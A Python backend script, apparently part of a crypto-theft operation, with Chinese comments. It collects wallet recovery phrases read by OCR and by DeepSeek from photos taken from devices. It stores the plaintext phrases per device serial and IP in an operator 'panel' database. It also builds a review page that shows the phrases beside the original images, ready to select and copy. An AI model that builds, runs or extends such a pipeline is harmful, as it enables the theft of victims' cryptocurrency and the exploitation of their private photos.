#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ds_sync_panel.py — 把 相册OCR / AI识别 / 待人工复核 结果同步进面板 + 生成复核页

显示设计（对齐面板现有机制）：
  · PG mnemonics 表为唯一读源：面板「助记词」栏、设备详情、仪表盘均读它；
    PG 记录接口 (recList) 直接返回 data jsonb 整行 → data 必须携带完整显示对象，
    否则列表面会显示"无明文"（2026-09-15 踩过的坑）。
  · 来源标签 app_type：'相册识别'（17链端侧OCR）/ 'AI模型识别'（DeepSeek）/ '⚠️待人工复核'
  · 待复核项（词表内、BIP39校验未过、疑似 TON 等非 BIP39 链）：图片复制到
    adm888app/public/assets/review/ 并生成 review/index.html（面板可直接访问）。
幂等：ukey = 'ocr:<pid>' / 'ai:<pid>' / 'rv:<pid>'，ON CONFLICT DO NOTHING。
用法：/root/venv/bin/python3 tools/ds_sync_panel.py
"""
import os, json, time, shutil, html, subprocess

BASE = '/www/wwwroot/i.131422.com'
HITS = os.path.join(BASE, 'adm888app/data/ds_ai_hits.jsonl')
RESCAN = os.path.join(BASE, 'adm888app/data/ds_ai_rescan.jsonl')
REVIEW_DIR = os.path.join(BASE, 'adm888app/public/assets/review')

def psql(sql):
    r = subprocess.run(['runuser', '-u', 'postgres', '--', 'psql', '-d', 'panel', '-At', '-F', '\t', '-c', sql],
                       capture_output=True, text=True)
    return [l.split('\t') for l in r.stdout.splitlines() if l.strip()]

def psql_exec(sql):
    return subprocess.run(['runuser', '-u', 'postgres', '--', 'psql', '-d', 'panel', '-c', sql],
                          capture_output=True, text=True)

def abbr(words):
    wl = words.split()
    if not wl:
        return ''
    return wl[0][:3] + '***' + wl[-1][-4:]

def esc(s):
    return s.replace("'", "''")

# ── 1) 组装三类记录 ───────────────────────────────────────────────────────────
rows = []          # (serial, plain, app_type, abbr, ukey, data_json, ts, created, ip)
review_items = []  # 供复核页

# 1a) 相册 OCR（PG photos word_n>0）
for r in psql("SELECT p.id, COALESCE(p.serial,''), COALESCE(p.ip::text,''), COALESCE(p.ts,0), "
              "COALESCE(p.data->>'words',''), COALESCE(p.data->>'word_n','0'), COALESCE(p.name,''), "
              "COALESCE(p.bin_path,'') "
              "FROM photos p WHERE p.data ? 'word_n' AND (p.data->>'word_n') ~ '^[0-9]+$' "
              "AND (p.data->>'word_n')::int > 0 AND COALESCE(p.data->>'words','') <> ''"):
    pid, serial, ip, ts, words, wn, name = r[0], r[1], r[2], r[3], r[4], r[5], r[6]
    bp = r[7] if len(r) > 7 else ''
    if not serial:
        continue
    d = {'serial': serial, 'ip': ip, 'app_type': '相册识别', 'bundle_id': '',
         'created_at': int(ts or 0), 'mnem_phrase_abbr': abbr(words), 'mnem_phrase_plain': words,
         'src': 'album-ocr', 'photo_id': int(pid), 'photo_name': name,
         'has_img': bool(bp)}   # 通道1（OCR）仅上报识别文本；仅当图上已有文件时面板才给"看原图"入口
    rows.append((serial, words, '相册识别', abbr(words), 'ocr:%s' % pid,
                 json.dumps(d, ensure_ascii=False), int(ts or 0), ip or None))

# 1b) AI 有效命中（首轮校验通过）
if os.path.exists(HITS):
    for ln in open(HITS, encoding='utf-8'):
        ln = ln.strip()
        if not ln:
            continue
        try:
            h = json.loads(ln)
        except Exception:
            continue
        if not h.get('checksum_ok') or not h.get('words'):
            continue
        pid = h.get('photo_id') or 0
        d = {'serial': h.get('serial') or '', 'ip': '', 'app_type': 'AI模型识别', 'bundle_id': '',
             'created_at': int(h.get('ts') or 0), 'mnem_phrase_abbr': abbr(h['words']),
             'mnem_phrase_plain': h['words'], 'src': 'ai-model', 'photo_id': pid,
             'has_img': True}   # AI 扫描只覆盖已有原图文件的照片
        rows.append((h.get('serial') or '', h['words'], 'AI模型识别', abbr(h['words']), 'ai:%s' % pid,
                     json.dumps(d, ensure_ascii=False), int(h.get('ts') or 0), None))

# 1c) 二次复扫：救回 + 待复核
if os.path.exists(RESCAN):
    for ln in open(RESCAN, encoding='utf-8'):
        ln = ln.strip()
        if not ln:
            continue
        try:
            r = json.loads(ln)
        except Exception:
            continue
        pid = r.get('photo_id') or 0
        serial = r.get('serial') or ''
        ts = int(r.get('ts') or 0)
        if r.get('checksum_ok') and r.get('pass2_words'):
            # 救回：以 ai:<pid> 入库（首轮未入库）
            d = {'serial': serial, 'ip': '', 'app_type': 'AI模型识别', 'bundle_id': '',
                 'created_at': ts, 'mnem_phrase_abbr': abbr(r['pass2_words']),
                 'mnem_phrase_plain': r['pass2_words'], 'src': 'ai-model-rescan', 'photo_id': pid,
                 'has_img': True}
            rows.append((serial, r['pass2_words'], 'AI模型识别', abbr(r['pass2_words']), 'ai:%s' % pid,
                         json.dumps(d, ensure_ascii=False), ts, None))
        elif r.get('checksum_ok') is False and r.get('pass2_words'):
            # 词表内·校验未过 → 疑似 TON 等非 BIP39 链 → 待人工复核
            d = {'serial': serial, 'ip': '', 'app_type': '⚠️待人工复核', 'bundle_id': '',
                 'created_at': ts, 'mnem_phrase_abbr': abbr(r['pass2_words']),
                 'mnem_phrase_plain': r['pass2_words'], 'src': 'ai-review', 'photo_id': pid,
                 'has_img': True,
                 'note': 'BIP39校验未过（词表内），疑似 TON 等非 BIP39 链助记词，请在复核页人工核对'}
            rows.append((serial, r['pass2_words'], '⚠️待人工复核', abbr(r['pass2_words']), 'rv:%s' % pid,
                         json.dumps(d, ensure_ascii=False), ts, None))
            review_items.append({'serial': serial, 'photo_id': pid, 'words': r['pass2_words'],
                                 'note': r.get('note') or ''})

# ── 2) 写 PG（幂等 + 全局去重） ───────────────────────────────────────────────
# 【2026-09-15】去重：同一明文助记词全库只保留最早一条——跨设备/跨来源重复命中一律跳过，
#   面板不再重复显示（与 panelPg.js / server.js 的显示层去重同口径）。
existing_plain = set(r[0] for r in psql("SELECT DISTINCT plain FROM mnemonics WHERE COALESCE(plain,'') <> '';"))
ins = 0
dup_skip = 0
for (serial, plain, atype, ab, ukey, dj, ts, ip) in rows:
    if plain and plain in existing_plain:
        dup_skip += 1
        continue
    sql = ("INSERT INTO mnemonics (serial, plain, app_type, abbr, ukey, data, ts, created_at, ip) VALUES "
           "('%s','%s','%s','%s','%s','%s'::jsonb,%d,to_timestamp(%f),%s) ON CONFLICT DO NOTHING;" % (
               esc(serial), esc(plain), esc(atype), esc(ab), esc(ukey), esc(dj), ts, ts / 1000.0,
               ("'%s'" % esc(ip)) if ip else 'NULL'))
    r = psql_exec(sql)
    if 'INSERT 0 1' in (r.stdout or ''):
        ins += 1
        if plain:
            existing_plain.add(plain)
print('[ds_sync] 候选 %d 条 → 新入库 %d 条 | 明文已存在跳过 %d 条 | 其余为重复/冲突跳过'
      % (len(rows), ins, dup_skip))

# ── 3) 复核页：复制图片 + 生成 index.html ─────────────────────────────────────
os.makedirs(REVIEW_DIR, exist_ok=True)

def _copy_review_image(src, dest):
    """bin_path（裸图 或 JSON 包裹 base64）→ 统一解码转 JPEG。
       修复：原实现直接 shutil.copy2，JSON 容器/HEIC 被原样复制为 .bin —— 浏览器无法显示。"""
    try:
        import base64 as _b64, io as _io
        from PIL import Image
        try:
            import pillow_heif
            pillow_heif.register_heif_opener()
        except Exception:
            pass
        raw = open(src, 'rb').read()
        if raw[:1] == b'{':
            try:
                j = json.loads(raw.decode('utf-8'))
                d = j.get('data') or ''
                if d:
                    raw = _b64.b64decode(d)
            except Exception:
                pass
        if raw[:3] == b'\xff\xd8\xff':
            open(dest, 'wb').write(raw)
            return True
        im = Image.open(_io.BytesIO(raw))
        im = im.convert('RGB')
        mx = max(im.size)
        if mx > 2000:   # 保留足够清晰度供人工核对，同时控制体积
            r = 2000 / mx
            im = im.resize((max(1, int(im.size[0] * r)), max(1, int(im.size[1] * r))), Image.LANCZOS)
        im.save(dest, 'JPEG', quality=88)
        return True
    except Exception as e:
        print('[ds_sync] 复核图转码失败:', src, str(e)[:80])
        return False

cards = []
for it in review_items:
    pid = it['photo_id']
    rr = psql("SELECT bin_path FROM photos WHERE id=%d;" % pid)
    img_rel = ''
    if rr:
        src = rr[0][0]
        if src and os.path.exists(src):
            # 【2026-09-16 修复】统一转 JPEG（原样复制 .bin/HEIC 浏览器显示不了）
            fn = 'review_%s_%s.jpg' % (it['serial'] or 'x', pid)
            if _copy_review_image(src, os.path.join(REVIEW_DIR, fn)):
                img_rel = fn
    wl = it['words'].split()
    cards.append(
        '<div class="card">'
        '<div class="meta">设备 <b>%s</b> · photo #%s · %d 词 · 待人工复核</div>'
        '<div class="tip">⚠️ 该图被 AI 识别出词序列但未通过 BIP39 校验（疑似 TON 等非 BIP39 链助记词，或个别词偏差）——请对照图片人工核对</div>'
        '<div class="words">%s</div>'
        '%s'
        '</div>' % (
            html.escape(it['serial'] or '?'), pid, len(wl),
            html.escape(it['words']),
            ('<img src="%s" loading="lazy">' % img_rel) if img_rel else '<div class="tip">(原图缺失)</div>'))

page = ('<!doctype html><html lang="zh"><head><meta charset="utf-8">'
        '<title>AI识别 · 待人工复核</title>'
        '<meta name="viewport" content="width=device-width,initial-scale=1">'
        '<style>body{font-family:-apple-system,"PingFang SC",sans-serif;background:#f5f6f8;margin:0;padding:20px;color:#222}'
        'h1{font-size:18px;margin:0 0 6px}'
        '.sub{color:#666;font-size:13px;margin-bottom:16px;line-height:1.6}'
        '.card{background:#fff;border-radius:12px;padding:14px;margin-bottom:14px;box-shadow:0 1px 4px rgba(0,0,0,.08)}'
        '.meta{font-size:13px;color:#333;margin-bottom:6px}'
        '.tip{font-size:12px;color:#b26a00;background:#fff7e6;border-left:3px solid #f0a020;padding:6px 8px;border-radius:4px;margin:6px 0}'
        '.words{font-family:ui-monospace,Menlo,monospace;font-size:13px;line-height:1.8;word-break:break-all;'
        'background:#f0f7ff;padding:10px;border-radius:8px;margin:8px 0;user-select:all}'
        'img{max-width:100%;border-radius:8px;border:1px solid #e3e3e3}'
        '</style></head><body>'
        '<h1>AI 识别 · 待人工复核（__N__ 条）</h1>'
        '<div class="sub">这些图片由 DeepSeek 识别出词序列但 BIP39 校验未通过（词表内）——常见原因是 <b>TON 等非 BIP39 链的助记词</b>（TON 用 BIP39 词表但校验规则不同）或个别词识别偏差。<br>'
        '面板助记词栏中对应条目标记为「⚠️待人工复核」。点击词序列可全选复制。<br>'
        '本页由 ds_sync_panel.py 自动生成，路径：/adm888panel/assets/review/</div>'
        '__CARDS__</body></html>')
page = page.replace('__N__', str(len(cards))).replace('__CARDS__', '\n'.join(cards))
open(os.path.join(REVIEW_DIR, 'index.html'), 'w', encoding='utf-8').write(page)
print('[ds_sync] 复核页生成: %s（%d 条）' % (os.path.join(REVIEW_DIR, 'index.html'), len(cards)))
